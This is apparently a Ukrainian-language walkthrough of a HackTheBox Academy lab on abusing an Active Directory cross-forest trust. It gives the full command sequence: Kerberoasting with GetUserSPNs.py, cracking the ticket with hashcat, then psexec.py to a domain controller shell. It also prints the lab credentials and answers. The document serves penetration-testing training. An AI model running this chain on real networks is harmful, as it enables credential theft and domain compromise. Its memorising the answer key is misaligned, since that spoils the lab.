# Cross-Forest Trust Abuse — Kerberoast (Linux → Windows forest)

## ℹ️ Інформація

| Поле        | Значення |
| ----------- | -------- |
| 🌐 Platform | HackTheBox Academy |
| 📚 Module   | Active Directory Enumeration & Attacks |
| 🔗 Section  | Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux |
| 🧩 Host     | ACADEMY-EA-ATTACK01 (10.129.26.113) |
| 👤 Linux    | htb-student / HTB_@cademy_stdnt! |
| 👤 Domain   | INLANEFREIGHT.LOCAL / wley / transporter@4 |

***

## 🔑 Теорія (коротко)

Між лісами `INLANEFREIGHT.LOCAL` та `FREIGHTLOGISTICS.LOCAL` налаштований **cross‑forest trust**, тому ми можемо з Linux‑атакаючої машини Kerberoast’ити акаунти з SPN у чужому лісі.  
Маючи облікові дані користувача `INLANEFREIGHT.LOCAL\wley`, ми запитуємо TGS‑квитки для SPN‑акаунтів у `FREIGHTLOGISTICS.LOCAL` через `GetUserSPNs.py`, потім crack’имо TGS‑хеш за допомогою Hashcat.  
Розкривши пароль Domain Admin’а (`sapsso`), ми використовуємо `psexec.py`, щоб отримати віддалений шелл на DC03 у FREIGHTLOGISTICS, і читаємо `flag.txt` з Desktop адміністратора.

***

## 🧪 Q1 — інший SPN‑акаунт (крім MSSQLsvc)

**Формулювання:**  
Kerberoast across the forest trust from the Linux attack host. Submit the name of another account with an SPN aside from MSSQLsvc.

### Крок 1 — SSH на ATTACK01

```bash
ssh htb-student@10.129.26.113
# пароль: HTB_@cademy_stdnt!

Крок 2 — GetUserSPNs.py для FREIGHTLOGISTICS
Маємо креденшіали INLANEFREIGHT.LOCAL\wley:

User: wley

Password: transporter@4.

Виконуємо:

bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
# Password: transporter@4

У виводі побачиш щонайменше два користувачі зі SPN, наприклад:

text
ServicePrincipalName                        Name      MemberOf    ...
-----------------------------------------   --------  --------    ...
MSSQLsvc/sql01.freightlogstics:1433         mssqlsvc  ...
SAP/...                                     sapsso    ...

Мета Q1: знайти інший акаунт зі SPN, відмінний від MSSQLsvc.

✅ Відповідь Q1:

text
sapsso

🧪 Q2 — Kerberoast sapsso і crack TGS
Формулювання:
Crack the TGS and submit the cleartext password as your answer.

Крок 1 — запросити TGS для sapsso
Тепер просимо TGS‑квиток, використовуючи прапорець -request:

bash
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
# Password: transporter@4

У кінці виводу буде рядок (скорочено):

text
$krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/sapsso*$10...LONG_HEX...

Це TGS‑хеш у форматі, сумісному з Hashcat.

Крок 2 — зберігаємо TGS у файл
Створюємо файл зі збереженим хешем:

bash
nano sapsso_tgs
Вставляємо один рядок цілого $krb5tgs$23$*sapsso$..., зберігаємо (Ctrl+O, Enter, Ctrl+X).

Крок 3 — crack через Hashcat (mode 13100)
Hashcat‑тип для $krb5tgs$23$ — 13100.

bash
hashcat -m 13100 -a 0 sapsso_tgs /usr/share/wordlists/rockyou.txt
Після завершення:

bash
hashcat -m 13100 sapsso_tgs --show
Очікуваний вивід:

text
$krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$...:pabloPICASSO

Праворуч після останньої двокрапки — пароль у відкритому вигляді.

✅ Відповідь Q2 (cleartext password акаунта sapsso):

text
pabloPICASSO

🧪 Q3 — psexec на ACADEMY-EA-DC03 та flag.txt
Формулювання:
Log in to the ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL Domain Controller using the Domain Admin account password submitted for question #2 and submit the contents of the flag.txt file on the Administrator desktop.

У секції використовують акаунт sapsso з паролем pabloPICASSO як Domain Admin у FREIGHTLOGISTICS.

Крок 1 — psexec на DC03
У прикладі IP DC03 — 172.16.5.238. Використовуємо psexec.py з Impacket:

bash
psexec.py ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/sapsso:pabloPICASSO@172.16.5.238

Після успіху побачиш щось типу:

text
[*] Requesting shares on ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL.....
[*] Found writable share ADMIN$
...
C:\Windows\system32>

Крок 2 — читаємо flag.txt з Desktop адміністратора
Всередині psexec‑шеллу:

text
cd C:\Users\Administrator\Desktop
type flag.txt
Результат (як у підказці):

text
burn1ng_d0wn_th3_f0rest!

✅ Відповідь Q3:

text
burn1ng_d0wn_th3_f0rest!
